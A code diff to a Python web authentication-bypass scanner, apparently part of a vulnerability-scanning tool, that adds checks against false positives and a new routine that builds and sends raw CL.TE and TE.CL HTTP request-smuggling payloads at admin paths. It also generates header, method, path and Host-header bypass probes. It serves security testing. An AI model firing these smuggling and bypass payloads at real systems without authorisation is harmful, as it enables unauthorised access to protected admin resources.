@@ -17,13 +17,15 @@ Version: 2.0.0
 
 from __future__ import annotations
 
+import socket
+import ssl
 from typing import TYPE_CHECKING, Any
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlparse
 
 import httpx
 
-from scanning.vuln_scanner import Finding
-from utils.exploitation_helper import ExploitationHelper, Difficulty
+from scanning.findings import Finding, Severity, VulnType
+from utils.scan_client import get_scan_client
 from utils.logger import get_logger
 from utils.rate_limiter import RateLimiter
 
@@ -35,6 +37,68 @@ if TYPE_CHECKING:
 logger = get_logger(__name__)
 
 
+def _is_real_bypass(normal_response, bypass_response) -> tuple[bool, str]:
+    """Validate that a 200 response is a REAL bypass, not just a different error page.
+
+    FIX 2026-02-12: 200 status alone is NOT proof of bypass.
+    A real bypass must:
+    1. Have different content from the normal response
+    2. Contain meaningful data (not redirect/error pages)
+    3. NOT be a generic SPA catch-all
+
+    Returns: (is_bypass, evidence_reason)
+    """
+    if bypass_response.status_code != 200:
+        return False, "not_200"
+
+    bypass_body = bypass_response.text.lower() if hasattr(bypass_response, 'text') else ""
+    normal_body = normal_response.text.lower() if hasattr(normal_response, 'text') else ""
+
+    # Check 1: Body must be different
+    if len(bypass_body) > 0 and len(normal_body) > 0:
+        # If bodies are very similar (within 10%), likely same page
+        if abs(len(bypass_body) - len(normal_body)) < min(len(bypass_body), len(normal_body)) * 0.1:
+            # Check content hash
+            import hashlib
+            bypass_hash = hashlib.md5(bypass_body.encode()).hexdigest()
+            normal_hash = hashlib.md5(normal_body.encode()).hexdigest()
+            if bypass_hash == normal_hash:
+                return False, "identical_content"
+
+    # Check 2: Not a generic error/redirect page
+    ERROR_PATTERNS = (
+        "unauthorized", "forbidden", "access denied", "not allowed",
+        "login required", "please sign in", "please log in", "redirect",
+        "404", "not found", "error", "<!doctype", "<html",
+    )
+    has_error = any(p in bypass_body for p in ERROR_PATTERNS)
+
+    # Check 3: Contains sensitive/protected data
+    SENSITIVE_PATTERNS = (
+        '"email"', '"user"', '"account"', '"admin"', '"role"',
+        '"token"', '"password"', '"balance"', '"credit"', '"id":',
+        '"data":', '"items":', '"results":', '"profile"', '"secret"',
+        '"api_key"', '"private"', '"config"', '"settings"',
+    )
+    has_sensitive = any(p in bypass_body for p in SENSITIVE_PATTERNS)
+
+    # Check 4: Response is JSON API (not HTML page)
+    is_json = "application/json" in bypass_response.headers.get("content-type", "").lower()
+
+    # Decision logic
+    if has_sensitive and not has_error:
+        return True, "contains_sensitive_data"
+    elif is_json and len(bypass_body) > 50:
+        return True, "json_api_response"
+    elif has_error:
+        return False, "error_page"
+    elif len(bypass_body) < 50:
+        return False, "too_short"
+
+    # If none of the above, be conservative
+    return False, "unverified"
+
+
 class AuthBypassScanner:
     """
     Authentication Bypass Scanner
@@ -44,7 +108,7 @@ class AuthBypassScanner:
     """
 
     def __init__(self, settings: Settings) -> None:
-        self.timeout = settings.timeouts.request_timeout
+        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
 
     async def scan(
         self,
@@ -63,6 +127,13 @@ class AuthBypassScanner:
         )
         findings.extend(bypass_findings)
 
+        # Desync-aware bypass: When smuggling is available, test auth bypass via desync
+        if isinstance(asset_data, dict) and asset_data.get("desync_enabled"):
+            desync_findings = await self._check_auth_bypass_via_desync(
+                base_url, asset_data, rate_limiter
+            )
+            findings.extend(desync_findings)
+
         return findings
 
     async def _check_auth_bypass_extended(
@@ -74,7 +145,7 @@ class AuthBypassScanner:
         """Extended authentication bypass testing."""
         findings = []
 
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
+        async with get_scan_client(timeout=self.timeout, verify_ssl=False) as client:
             for path in PROTECTED_PATHS:
                 await rate_limiter.acquire()
 
@@ -92,7 +163,9 @@ class AuthBypassScanner:
                         await rate_limiter.acquire()
                         bypass_response = await client.get(url, headers=headers)
 
-                        if bypass_response.status_code == 200:
+                        # FIX 2026-02-12: Validate that 200 is a REAL bypass, not error page
+                        is_bypass, bypass_evidence = _is_real_bypass(normal_response, bypass_response)
+                        if bypass_response.status_code == 200 and is_bypass:
                             # Generate POC for header bypass
                             header_str = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
                             poc = {
@@ -109,24 +182,25 @@ class AuthBypassScanner:
                                 "prerequisites": ["None - unauthenticated attack"],
                             }
                             findings.append(Finding(
-                                type="authentication",
+                                vuln_type=VulnType.AUTH_BYPASS,
                                 name="Authentication Bypass via Headers",
-                                severity="CRITICAL",
-                                description="Protected resource accessible with special headers.",
+                                severity=Severity.CRITICAL,
+                                description=f"Protected resource accessible with special headers. Evidence: {bypass_evidence}",
                                 host=base_url,
-                                matched_at=url,
+                                endpoint=url,
                                 evidence=[
                                     f"Normal: {normal_response.status_code}",
                                     f"Headers: {headers}",
                                     f"Bypass: {bypass_response.status_code}",
+                                    f"Validation: {bypass_evidence}",
                                 ],
                                 cvss_score=9.8,
-                                cwe="CWE-287",
+                                cwe_id="CWE-287",
                                 remediation="Implement authentication at application level. "
                                            "Do not trust HTTP headers for auth decisions.",
                                 metadata={"poc": poc},
                             ).to_dict())
-                            break
+                            # FN-FIX 2026-02-08: Don't break - test ALL bypass headers
 
                     # Test HTTP method bypass
                     bypass_methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE"]
@@ -134,7 +208,9 @@ class AuthBypassScanner:
                         await rate_limiter.acquire()
                         try:
                             method_response = await client.request(method, url)
-                            if method_response.status_code == 200:
+                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
+                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, method_response)
+                            if method_response.status_code == 200 and is_bypass:
                                 # Generate POC for method bypass
                                 poc = {
                                     "working_payload": f"HTTP {method} instead of GET",
@@ -150,22 +226,23 @@ class AuthBypassScanner:
                                     "prerequisites": ["None - unauthenticated attack"],
                                 }
                                 findings.append(Finding(
-                                    type="authentication",
+                                    vuln_type=VulnType.AUTH_BYPASS,
                                     name="Authentication Bypass via HTTP Method",
-                                    severity="HIGH",
-                                    description=f"Protected resource accessible via {method} method.",
+                                    severity=Severity.HIGH,
+                                    description=f"Protected resource accessible via {method} method. Evidence: {bypass_evidence}",
                                     host=base_url,
-                                    matched_at=url,
+                                    endpoint=url,
                                     evidence=[
                                         f"GET: {normal_response.status_code}",
                                         f"{method}: {method_response.status_code}",
+                                        f"Validation: {bypass_evidence}",
                                     ],
                                     cvss_score=8.1,
-                                    cwe="CWE-287",
+                                    cwe_id="CWE-287",
                                     remediation="Apply authentication to all HTTP methods.",
                                     metadata={"poc": poc},
                                 ).to_dict())
-                                break
+                                # FN-FIX 2026-02-08: Don't break - test ALL HTTP methods
                         except (httpx.HTTPError, httpx.TimeoutException, OSError):
                             continue
 
@@ -215,7 +292,9 @@ class AuthBypassScanner:
                         variant_url = urljoin(base_url, variant)
                         try:
                             variant_response = await client.get(variant_url)
-                            if variant_response.status_code == 200:
+                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
+                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, variant_response)
+                            if variant_response.status_code == 200 and is_bypass:
                                 # Generate POC for path manipulation bypass
                                 poc = {
                                     "working_payload": variant,
@@ -231,23 +310,24 @@ class AuthBypassScanner:
                                     "prerequisites": ["None - unauthenticated attack"],
                                 }
                                 findings.append(Finding(
-                                    type="authentication",
+                                    vuln_type=VulnType.AUTH_BYPASS,
                                     name="Authentication Bypass via Path Manipulation",
-                                    severity="HIGH",
-                                    description="Protected resource accessible via path manipulation.",
+                                    severity=Severity.HIGH,
+                                    description=f"Protected resource accessible via path manipulation. Evidence: {bypass_evidence}",
                                     host=base_url,
-                                    matched_at=variant_url,
+                                    endpoint=variant_url,
                                     evidence=[
                                         f"Original: {path} -> {normal_response.status_code}",
+                                        f"Validation: {bypass_evidence}",
                                         f"Bypass: {variant} -> {variant_response.status_code}",
                                     ],
                                     cvss_score=8.1,
-                                    cwe="CWE-287",
+                                    cwe_id="CWE-287",
                                     remediation="Normalize paths before authentication check. "
                                                "Use strict path matching.",
                                     metadata={"poc": poc},
                                 ).to_dict())
-                                break
+                                # FN-FIX 2026-02-08: Don't break - test ALL path variants
                         except (httpx.HTTPError, httpx.TimeoutException, OSError):
                             continue
 
@@ -272,22 +352,25 @@ class AuthBypassScanner:
                         await rate_limiter.acquire()
                         try:
                             host_response = await client.get(url, headers=headers)
-                            if host_response.status_code == 200:
+                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
+                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, host_response)
+                            if host_response.status_code == 200 and is_bypass:
                                 findings.append(Finding(
-                                    type="authentication",
+                                    vuln_type=VulnType.AUTH_BYPASS,
                                     name="API Gateway Bypass via Host Header",
-                                    severity="CRITICAL",
+                                    severity=Severity.CRITICAL,
                                     description=f"Protected endpoint accessible by manipulating Host header. "
-                                               f"This indicates the API gateway trusts Host/X-Forwarded-Host headers.",
+                                               f"Evidence: {bypass_evidence}",
                                     host=base_url,
-                                    matched_at=url,
+                                    endpoint=url,
                                     evidence=[
                                         f"Normal request: {normal_response.status_code}",
                                         f"With {list(headers.keys())[0]}: {host_response.status_code}",
                                         f"Headers used: {headers}",
+                                        f"Validation: {bypass_evidence}",
                                     ],
                                     cvss_score=9.1,
-                                    cwe="CWE-287",
+                                    cwe_id="CWE-287",
                                     remediation="Do not trust Host headers for routing decisions. "
                                                "Validate Host header against allowlist at gateway level.",
                                     metadata={
@@ -314,21 +397,24 @@ class AuthBypassScanner:
                         try:
                             # Send POST but override to GET
                             override_response = await client.post(url, headers=headers)
-                            if override_response.status_code == 200 and normal_response.status_code in [401, 403]:
+                            # FIX 2026-02-12: Validate that 200 is a REAL bypass
+                            is_bypass, bypass_evidence = _is_real_bypass(normal_response, override_response)
+                            if override_response.status_code == 200 and normal_response.status_code in [401, 403] and is_bypass:
                                 findings.append(Finding(
-                                    type="authentication",
+                                    vuln_type=VulnType.AUTH_BYPASS,
                                     name="API Gateway Method Override Bypass",
-                                    severity="HIGH",
+                                    severity=Severity.HIGH,
                                     description=f"Authentication bypassed using HTTP method override header. "
-                                               f"Gateway respects {list(headers.keys())[0]} header.",
+                                               f"Evidence: {bypass_evidence}",
                                     host=base_url,
-                                    matched_at=url,
+                                    endpoint=url,
                                     evidence=[
                                         f"GET request: {normal_response.status_code}",
                                         f"POST with override header: {override_response.status_code}",
+                                        f"Validation: {bypass_evidence}",
                                     ],
                                     cvss_score=8.1,
-                                    cwe="CWE-287",
+                                    cwe_id="CWE-287",
                                     remediation="Disable method override features in production. "
                                                "Apply auth checks after method override resolution.",
                                 ).to_dict())
@@ -340,3 +426,171 @@ class AuthBypassScanner:
                     logger.debug(f"Auth bypass check failed for {url}: {e}")
 
         return findings
+
+    async def _check_auth_bypass_via_desync(
+        self,
+        base_url: str,
+        asset_data: dict[str, Any],
+        rate_limiter: RateLimiter,
+    ) -> list[dict[str, Any]]:
+        """
+        Test auth bypass via HTTP request smuggling/desync.
+
+        When desync is available (from smuggling_scanner findings), smuggled requests
+        may bypass front-end authentication checks that the backend doesn't see.
+        """
+        findings = []
+        desync_type = asset_data.get("desync_type", "CL.TE") if isinstance(asset_data, dict) else "CL.TE"
+
+        parsed = urlparse(base_url)
+        hostname = parsed.hostname or ""
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        use_ssl = parsed.scheme == "https"
+
+        # Admin paths that may be protected by frontend only
+        admin_paths = ["/admin", "/api/admin", "/internal", "/dashboard", "/management"]
+
+        for path in admin_paths:
+            await rate_limiter.acquire()
+
+            try:
+                # Build smuggled request based on desync type
+                if desync_type in ("CL.TE", "cl_te"):
+                    # CL.TE: Frontend uses Content-Length, Backend uses Transfer-Encoding
+                    smuggled = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {hostname}\r\n"
+                        f"\r\n"
+                    )
+                    request = (
+                        f"POST / HTTP/1.1\r\n"
+                        f"Host: {hostname}\r\n"
+                        f"Content-Length: {len(smuggled)}\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"\r\n"
+                        f"0\r\n"
+                        f"\r\n"
+                        f"{smuggled}"
+                    )
+                else:  # TE.CL
+                    # TE.CL: Frontend uses Transfer-Encoding, Backend uses Content-Length
+                    smuggled_len = len(f"GET {path} HTTP/1.1\r\nHost: {hostname}\r\n\r\n")
+                    request = (
+                        f"POST / HTTP/1.1\r\n"
+                        f"Host: {hostname}\r\n"
+                        f"Content-Length: 4\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"\r\n"
+                        f"{smuggled_len:x}\r\n"
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {hostname}\r\n"
+                        f"\r\n"
+                        f"0\r\n"
+                        f"\r\n"
+                    )
+
+                response = await self._send_raw_request(
+                    hostname, port, use_ssl, request
+                )
+
+                # Check if we got admin content in response
+                if response and self._looks_like_admin_access(response):
+                    findings.append(Finding(
+                        vuln_type=VulnType.AUTH_BYPASS,
+                        name=f"Auth Bypass via HTTP Smuggling ({desync_type})",
+                        severity=Severity.CRITICAL,
+                        confidence_score=90.0,
+                        description=(
+                            f"Authentication bypassed using HTTP request smuggling ({desync_type}). "
+                            f"The frontend authenticates requests, but the smuggled request reaches "
+                            f"the backend directly, bypassing authentication checks."
+                        ),
+                        host=base_url,
+                        endpoint=f"{base_url}{path}",
+                        evidence=[
+                            f"Desync type: {desync_type}",
+                            f"Smuggled path: {path}",
+                            f"Response indicates admin access",
+                            f"Response preview: {response[:500]}...",
+                        ],
+                        cvss_score=9.8,
+                        cwe_id="CWE-444",
+                        remediation=(
+                            "Fix the HTTP smuggling vulnerability first. "
+                            "Ensure both frontend and backend use consistent HTTP parsing. "
+                            "Implement authentication at the backend level, not just the gateway."
+                        ),
+                        metadata={
+                            "desync_type": desync_type,
+                            "smuggled_path": path,
+                            "can_chain": True,
+                            "bypass_waf": True,
+                        },
+                    ).to_dict())
+                    logger.info(f"[AUTH_BYPASS] Found desync auth bypass: {path}")
+                    break  # Found one, stop testing
+
+            except Exception as e:
+                logger.debug(f"[AUTH_BYPASS] Desync test failed for {path}: {e}")
+
+        return findings
+
+    async def _send_raw_request(
+        self,
+        hostname: str,
+        port: int,
+        use_ssl: bool,
+        request: str,
+        timeout: float = 10.0,
+    ) -> str:
+        """Send raw HTTP request via socket."""
+        import asyncio
+
+        def _sync_send():
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            try:
+                if use_ssl:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(sock, server_hostname=hostname)
+
+                sock.connect((hostname, port))
+                sock.sendall(request.encode())
+
+                response = b""
+                try:
+                    while True:
+                        chunk = sock.recv(4096)
+                        if not chunk:
+                            break
+                        response += chunk
+                except socket.timeout:
+                    pass
+
+                return response.decode("utf-8", errors="ignore")
+            finally:
+                sock.close()
+
+        loop = asyncio.get_event_loop()
+        return await loop.run_in_executor(None, _sync_send)
+
+    def _looks_like_admin_access(self, response: str) -> bool:
+        """Check if response indicates successful admin access."""
+        if "HTTP/1." not in response:
+            return False
+
+        # Check for 200 OK
+        if " 200 " not in response and " 200\r\n" not in response:
+            return False
+
+        # Look for admin-related content
+        admin_indicators = [
+            "dashboard", "admin", "management", "settings", "users",
+            "configuration", "\"role\"", "\"admin\"", "\"permissions\"",
+            "delete", "modify", "create", "user_id",
+        ]
+
+        response_lower = response.lower()
+        return any(indicator in response_lower for indicator in admin_indicators)
